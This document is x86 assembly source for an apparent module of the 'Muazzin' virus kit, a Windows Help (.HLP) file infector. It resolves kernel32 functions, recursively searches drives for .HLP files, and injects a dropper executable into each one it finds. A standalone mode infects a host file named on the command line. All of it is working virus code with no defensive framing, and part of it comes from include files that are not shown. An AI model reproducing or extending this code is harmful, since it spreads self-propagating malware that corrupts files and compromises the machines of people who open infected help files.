.586p
.model   flat
locals __
jumps

by  equ byte ptr
wo  equ word ptr
dwo equ dword ptr
ofs equ offset

.xlist
include \inc\win32api.inc
.list
include \muazzin\muazzin.asi
include \muazzin\samples\crc.mac

.code

_TYPE    = "plhi"
_VERSION = 0100h

start:
       mov esi, [esp+4]
       test dwo [esi+m_why], MT_APP
       jz __query
       pushad
       xchg edi, esi
       call delta
       mov eax, [edi+GPA]
       mov [esi+getpaddr], eax
       mov eax, [edi+GMH]
       mov [esi+getmhnd], eax
       mov ecx, [edi+m_droppersize]
       mov [esi+dropper_size], ecx
       mov dwo [esi+pe_size], ecx
       mov edi, [edi+m_dropper]
       call delta
       add esi, ofs buffer_
       xchg esi, edi
       push ecx
       push esi
       mov ecx, ofs pepatch_-ofs pepatch
       lea esi, [edi-(ofs buffer_-ofs pepatch)]
       rep movsb
       pop esi
       pop ecx
       rep movsb
       call get_apis
       call delta
       add esi, ofs callback
       push esi
       call busca_recursiva
  rotina_pra_rodar equ $-4
       popad
  __fuck:
       mov dwo [esi+m_result], MR_DONE
  __done:
       ret 4
  __query:
       test dwo [esi+m_why], MT_QUERY
       jz __fuck
       mov esi, MT_QUERY+MT_APP
       mov ebx, _TYPE
       mov ecx, _VERSION
       mov eax, MR_DONE
       jmp __done

callback:
       pushad
       call delta
       push 100
       call [esi+Sleep]
       mov edx, [esp+(8*4)+4]
       mov esi, edx
  __search0:
       lodsb
       test al, al
       jne __search0
       mov edi, esi

;       mov eax, [edi-9]
;       and eax, not 020202020h          ;DEBUG CODE!
;       cmp eax, "TSET"
;       jne __isnt

       mov eax, [edi-5]
       and eax, not 020202000h
       cmp eax, "PLH."
       jne __isnt
       call infect_hlp
       push 1000*10
       call delta
       call [esi+Sleep]
  __isnt:
       popad
       ret 4

delta:
       call __delta
  __delta:
       pop esi
       sub esi, ofs __delta
       ret

get_apis:
       call delta
       lea eax,[esi+krnl]
       push eax
       call [esi+getmhnd]
       mov ebp, eax
       push esi
       add esi, ofs GetDriveType
       mov edi, esi
  __next:
       lodsd
       test eax, eax
       jz __allgot
       mov edx, [esp]
       add eax, edx
       push eax
       push ebp
       call [edx+getpaddr]
       stosd
       jmp __next
  __allgot:
       pop eax
       ret

include hlp.asi

getmhnd              dd 0
getpaddr             dd 0

GetDriveType         dd ofs api001
SetCurrentDirectoryA dd ofs api002
FindFirstFileA       dd ofs api003
FindNextFileA        dd ofs api004
FindClose            dd ofs api005
SetLastError         dd ofs api006
GetLastError         dd ofs api007
CreateFileA          dd ofs api008
CloseHandle          dd ofs api009
SetFilePointer       dd ofs api010
WriteFile            dd ofs api011
ReadFile             dd ofs api012
SetFileAttributesA   dd ofs api013
GetFileSize          dd ofs api014
LocalAlloc           dd ofs api015
LocalFree            dd ofs api016
Sleep                dd ofs api017
                     dd 0

krnl   db "KERNEL32.DLL",0

api001 db "GetDriveTypeA", 0
api002 db "SetCurrentDirectoryA", 0
api003 db "FindFirstFileA", 0
api004 db "FindNextFileA", 0
api005 db "FindClose", 0
api006 db "SetLastError", 0
api007 db "GetLastError", 0
api008 db "CreateFileA", 0
api009 db "CloseHandle", 0
api010 db "SetFilePointer", 0
api011 db "WriteFile", 0
api012 db "ReadFile", 0
api013 db "SetFileAttributesA", 0
api014 db "GetFileSize", 0
api015 db "LocalAlloc", 0
api016 db "LocalFree", 0
api017 db "Sleep", 0

pepatch:
include dropper.asi
pepatch_:

include \muazzin\samples\search.asi
include \muazzin\samples\fioexlow.asi

align 4
db "****"
infect_this_file:
       mov edx, ofs name2
       call infect_hlp
       ret 4
buffer_:

.data

main:
       mov eax, ofs GetModuleHandleA
       mov [gmhandle], eax
       mov eax, ofs GetProcAddress
       mov [gpaddy], eax
       push ofs krnl
extrn GetModuleHandleA:PROC
       call GetModuleHandleA
       mov [_kernel_], eax
extrn GetCommandLineA:PROC
       call GetCommandLineA
       xchg eax, esi
  __loop1:
       lodsb
       test al, al
       jz __exit2
       cmp al, " "
       jne __loop1
       mov edi, ofs name1
  __name1_cpy:
       lodsb
       cmp al, 0dh
       je __exit2
       test al, al
       je __exit2
       cmp al, " "
       je __name1_done
       stosb
       jmp __name1_cpy
  __name1_done:
       sub eax, eax
       stosd
       mov edi, ofs name2
  __name2_cpy:
       lodsb
       cmp al, 0dh
       je __name2_done
       test al, al
       je __name2_done
       cmp al, " "
       je __name2_done
       stosb
       jmp __name2_cpy
  __name2_done:
       sub eax, eax
       stosd
       push 1024*1024
       push 40h
extrn GlobalAlloc:PROC
       call GlobalAlloc
       test eax, eax
       jz __exit
       push eax
       mov edi, eax
       add eax, 24*1024
       mov [dropper], eax
       mov ecx, (buffer_-start)
       mov esi, ofs start
       rep movsb
       xchg edi, eax
       mov dwo [eax-(buffer_-start)+(rotina_pra_rodar-start)],(infect_this_file-(rotina_pra_rodar+4))
       mov dwo [eax-(buffer_-start)+(hlpmemalloc-start)], 1024*1024
       push 0
       push 80h
       push 3
       push 0
       push 0
       push 0c0000000h
       push ofs name1
       call __tmp1
       db "CreateFileA",0
  __tmp1:
       push [_kernel_]
extrn GetProcAddress:PROC
       call GetProcAddress
       call eax
       mov ebx,eax
       inc eax
       jz __exit2
       push 0
       mov eax, esp
       push 0
       push eax
       push 999*1024
       push edi
       push ebx
call __tmp2
db "ReadFile",0
__tmp2:
push [_kernel_]
call GetProcAddress
       call eax
       pop edi
       mov [size], edi
       push ebx
call __tmp3
db "CloseHandle",0
__tmp3:
push [_kernel_]
call GetProcAddress
       call eax
       pop eax
       push ofs __tmp4
       call eax
  __exit:
       push 0
extrn ExitProcess:PROC
       call ExitProcess
  __exit2:
       push 0
       call __skipz1
       db "Muazzin/Standalone HLP Infector",0
  __skipz1:
       call __skipz12
       db "USAGE:",13,10
       db "<dropper.exe> <host.hlp>",0
  __skipz12:
       push 0
extrn MessageBoxA:PROC
       call MessageBoxA
       jmp __exit

__tmp4:
         dd MT_APP
dropper  dd ?
size     dd ?
gmhandle dd ?
gpaddy   dd ?

_kernel_ dd ?

name1 db 128 dup (?)
name2 db 128 dup (?)

end    main

